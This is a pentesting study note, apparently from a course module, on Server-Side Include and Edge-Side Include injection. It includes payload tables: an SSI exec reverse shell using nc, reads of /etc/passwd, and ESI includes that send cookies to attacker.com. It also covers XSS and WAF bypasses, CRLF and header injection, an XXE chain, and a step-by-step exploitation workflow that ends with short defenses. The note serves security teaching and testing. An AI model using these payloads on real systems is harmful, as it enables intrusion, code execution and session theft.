---
tags: [vapt, injection, ssi, esi, rce, cache, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.19 SSI / ESI Injection"
---

# 10.19 — Server-Side Includes (SSI) & Edge-Side Includes (ESI) Injection

## What is it?
This note covers two related "include" injection bugs:

- **SSI (Server-Side Includes)** — directives embedded in HTML that the **web server** evaluates before serving the page (e.g. "insert the current date here", "include this file", "run this command"). If user input reaches an SSI-processed page unsanitised, you can inject your own directives → file read or **command execution**.
- **ESI (Edge-Side Includes)** — the same idea but at the **caching/CDN layer** (Varnish, Squid, Akamai, Fastly). A reverse-proxy/surrogate evaluates `<esi:...>` tags to assemble cached pages. The surrogate **cannot tell your injected ESI tags from legitimate upstream ones**, so injecting them gives XSS, SSRF, cookie theft, and more.

Think of SSI like a document with "mail-merge" fields the server fills in — if you can write your own fields, you can make it run `<!--#exec cmd="..." -->`. ESI is the same merge happening at the delivery truck (CDN) instead of the warehouse (origin).

## SSI — fingerprinting
- File extensions **`.shtml`, `.shtm`, `.stm`** strongly suggest SSI (but not exclusively).
- Directive format: `<!--#directive param="value" -->`
- Inject a harmless echo and see if it evaluates.

## SSI — payloads
| Goal | Payload |
|---|---|
| Print local date | `<!--#echo var="DATE_LOCAL" -->` |
| Print document name | `<!--#echo var="DOCUMENT_NAME" -->` |
| Dump all variables | `<!--#printenv -->` |
| Set a variable | `<!--#set var="name" value="Rich" -->` |
| Include a file (path) | `<!--#include file="/etc/passwd" -->` |
| Include a file (virtual) | `<!--#include virtual="/index.html" -->` |
| Include CGI output | `<!--#include virtual="/cgi-bin/counter.pl" -->` |
| File mod-time | `<!--#flastmod file="index.html" -->` |
| Execute command | `<!--#exec cmd="ls" -->` |
| Reverse shell | `<!--#exec cmd="mkfifo /tmp/f;nc <IP> <PORT> 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

**Detection probe:** inject `<!--#echo var="DATE_LOCAL" -->`. If the response shows a real date instead of the literal string, SSI is live → escalate to `#include` (file read) then `#exec` (RCE).

## ESI — detection
- Response header signalling ESI:
  ```http
  Surrogate-Control: content="ESI/1.0"
  ```
- Header may be absent yet ESI still active. **Reflection probe:**
  ```html
  hell<!--esi-->o
  ```
  If it renders as `hello` (the comment stripped by the ESI engine), it's vulnerable.
- **Blind / OOB probe** (callback to your server):
  ```html
  <esi:include src=http://attacker.com>
  <esi:debug/>          <!-- Akamai: dumps debug info into the response -->
  ```

## ESI — capability matrix
Different surrogates support different ESI features; what you can do depends on the software:

| Software | Includes | Vars | Cookies | Upstream hdr required | Host allowlist |
|---|---|---|---|---|---|
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No | No |
| NodeJS esi | Yes | Yes | Yes | No | No |
| NodeJS nodesi | Yes | No | No | No | Optional |

- **Includes** = supports `<esi:include>` (→ SSRF / content injection).
- **Vars** = supports `<esi:vars>` (→ XSS filter bypass).
- **Cookies** = ESI engine can read document cookies (→ steal HttpOnly cookies).
- **Host allowlist** = includes only to allowed hosts (limits SSRF).

## ESI — exploitation payloads

**XSS (load arbitrary HTML into the response):**
```xml
<esi:include src=http://attacker.com/xss.html>
```

**Bypass client-side XSS filters / WAF** (split keywords with `<!--esi-->` or assemble via vars):
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/bypass/);</s<esi:vars name="$(var1)"/>>

<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```

**Steal cookies (including HttpOnly):**
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
Reflect cookie into response then XSS-exfil:
```text
<!--esi $(HTTP_COOKIE) -->
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```

**Read private local file** (not classic LFI — ESI fetch):
```html
<esi:include src="secret.txt">
```

**CRLF injection via include src:**
```html
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```

**Open redirect (inject Location header):**
```text
<!--esi $add_header('Location','http://attacker.com') -->
```

**Add / override response headers** (e.g. flip Content-Type to enable XSS on a JSON endpoint):
```text
<!--esi/$add_header('Content-Type','text/html')/-->
```

**Add header in a forced sub-request, incl. CRLF (CVE-2019-2438):**
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```

**ESI + XSLT → XXE** (use `dca="xslt"` to pull in a stylesheet that triggers XML External Entity):
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
→ see [[20 - XSLT Injection]] for the XSLT side.

## ASCII Diagram
```text
================================================================================
                    SSI (origin) vs ESI (CDN/edge) INJECTION
================================================================================

  SSI:   user input --> [ORIGIN web server] parses <!--#exec cmd--> --> RCE
                                  |
                                  v
                          page returned to user

  ESI:   user input --> [ORIGIN] reflects <esi:include ...> into body
                                  |
                                  v
                        [CDN / SURROGATE cache]  <-- evaluates ESI tags
                          | can't tell injected from legit
                          v
                 SSRF / XSS / cookie theft / header inject
================================================================================
```

## Hands-on workflow
1. Find a reflection point and a page likely processed by SSI (`.shtml`) or behind a cache (check `Surrogate-Control`, `X-Cache`, `Via`, `Age` headers).
2. **SSI:** probe `<!--#echo var="DATE_LOCAL" -->` → if evaluated, try `#include file="/etc/passwd"`, then `#exec cmd="id"`, then reverse shell.
3. **ESI:** probe `hell<!--esi-->o` and a blind `<esi:include src=http://YOURHOST>`; watch your listener.
4. Identify the surrogate (Server/Via headers) → consult the capability matrix to pick viable payloads.
5. Escalate per capability: SSRF via include, XSS via vars, cookie theft, XXE via XSLT.

**Tools:** `SSTImap` (`--legacy -e SSI`) automates SSI detection/exploitation; brute-force wordlist `ssi_esi.txt`.

## Defense
- **Never** let user input reach an SSI/ESI-processed context. Disable `exec` (`Options -IncludesNOEXEC` in Apache) if SSI is needed at all.
- HTML-encode `<`, `>`, `#`, `"` before output in SSI pages.
- On the CDN: disable ESI processing for untrusted content, require signed `Surrogate-Control`, and enforce **host allowlists** for includes.
- Set correct `Content-Type` + `X-Content-Type-Options: nosniff`; don't let ESI rewrite security headers.

## Related
- [[20 - XSLT Injection]] — chained from ESI for XXE
- [[../I - 09 - SSTI/01 - What is SSTI]] — sibling template-evaluation bug
- [[../I - 13 - SSRF/01 - What is SSRF]] — ESI includes are an SSRF primitive
